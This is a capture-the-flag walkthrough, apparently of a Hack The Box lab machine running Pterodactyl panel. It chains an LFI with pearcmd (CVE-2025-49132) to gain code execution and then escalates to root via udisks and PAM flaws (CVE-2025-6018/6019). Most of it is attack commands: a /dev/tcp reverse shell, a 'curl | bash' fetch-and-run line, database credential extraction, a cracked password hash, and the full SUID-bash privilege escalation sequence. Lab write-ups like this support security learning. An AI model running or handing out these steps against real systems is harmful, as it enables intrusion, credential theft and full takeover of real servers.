# Initial Recon 

#### nmap 
```nmap 
# Nmap 7.98 scan initiated Wed Feb 11 09:56:50 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC --min-rate=5000 -oN nmap.txt -p- 10.129.14.31
Nmap scan report for 10.129.14.31
Host is up (0.31s latency).
Not shown: 65498 filtered tcp ports (no-response), 33 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 11 09:57:29 2026 -- 1 IP address (1 host up) scanned in 38.35 seconds
```

#### ffuf 
```
ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt   

.htm                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 92ms]
.html                   [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 152ms]
.                       [Status: 200, Size: 1686, Words: 429, Lines: 55, Duration: 59ms]
.htaccess               [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 120ms]
Public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 56ms]
.htc                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 60ms]
.html_var_DE            [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 157ms]

```

changelog.txt 
<img src="assets/Pasted image 20260212000816.png">
Pterodactyl panel v1.11.10 

##### Gobuster (subdomain)
```
gobuster vhost -u http://pterodactyl.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 50
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
panel.pterodactyl.htb Status: 200 [Size: 1897]
Progress: 1363 / 4989 (27.32%)

```

<img src="assets/Pasted image 20260211233933.png">

this [CVE-2025-49132](https://github.com/YoyoChaud/CVE-2025-49132) wont work alone , u need to round it up somehow. 

if u pay an attention on the [Pterodactyl v1.11.10](https://github.com/pterodactyl/panel/releases) release, theres an LFI thru the `/locales/locale.json?&locale=../../../../../Pterodactyl&namespace=config/app` path combining it with the pearcmd vurnability we can perform command execution, 

pearcmd doesnt allow any built-in shell command to be execute it so we can do something about it actually 

creating a file containing the reverseshell 
```bash 
#!/bin/bash 

sh -i >& /dev/tcp/10.10.14.56/4444 0>&1
```

and a web server 

```
python3 -m http.server
```

set up a listern and i used penelope which is a good alternative for nc 
```
penelope -p 4444 
```

and execute 
```
python3 ape1.py --host panel.pterodactyl.htb --command "curl http://10.10.14.56:8000/shell.sh | bash"
```

cute
<img src="assets/Pasted image 20260211235231.png">

# Post exploitation
earlier we said that we had an LFI on the `/locales/locale.json?&locale=../../../../../Pterodactyl&namespace=config/app`, i fuzzed the config/app which revealed the database creds. which they are on the environment anyway 
```bash
DB_PORT=3306
DB_HOST=127.0.0.1
DB_PASSWORD=PteraPanel
DB_USERNAME=pterodactyl
DB_CONNECTION=mysql
DB_DATABASE=panel
```

connect to the database 

<img src="assets/Pasted image 20260211235704.png">
users table 
<img src="assets/Pasted image 20260211235723.png">

hashes !!! 
<img src="assets/Pasted image 20260212000143.png">

we can crack `phileasfogg3` hash ..and we get 
```
$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

now we can SSH 

## PRIV ESC 

the `expiry` was a rabbithole .. also the crontab .. they tricked us but theres a  hint inthe mail saying that udisk is acting weird 

<img src="assets/Pasted image 20260215155855.png">

theres an exploit for that [CVE-2025-6018](https://github.com/ibrahmsql/CVE-2025-6018) and  [CVE-2025-6019](https://github.com/guinea-offensive-security/CVE-2025-6019)
in order for the exploit to run u need to read carefully BOTH of the CVEs 

lets begin our final exploit !!

##### On the victim machine as phileasfogg3, add this to .pam_environment
```bash
{ echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment`
```

##### Exit and SSH back in
``exit``

```bash
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanSuspend
```

##### Should return ('yes',) not ('challenge',)

##### On YOUR Kali machine
```bash 
dd if=/dev/zero of=./xfs.image bs=1M count=300
mkfs.xfs ./xfs.image
mkdir ./xfs.mount
mount -t xfs ./xfs.image ./xfs.mount
cp /bin/bash ./xfs.mount
chmod 04555 ./xfs.mount/bash
umount ./xfs.mount
```

##### Transfer to victim
```bash
scp ./xfs.image phileasfogg3@10.129.1.47:
```

#### Kill gvfs if running
```bash 
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null
```

#### Setup loop device
udisksctl loop-setup --file ./xfs.image --no-user-interaction

###### Note the /dev/loopX number it gives you!

###### Start the busy loop in background (replace loop0 with your loop device)
```bash
while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break; done 2>/dev/null &
```

###### Trigger the resize (replace loop0 with your device)
```bash
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

##### You should see the SUID bash appear, then run it!
```bash
/tmp/blockdev*/bash -p
```

##### Verify root
<img src="assets/Pasted image 20260212000719.png">
we are part of the root group so we can say we did it 
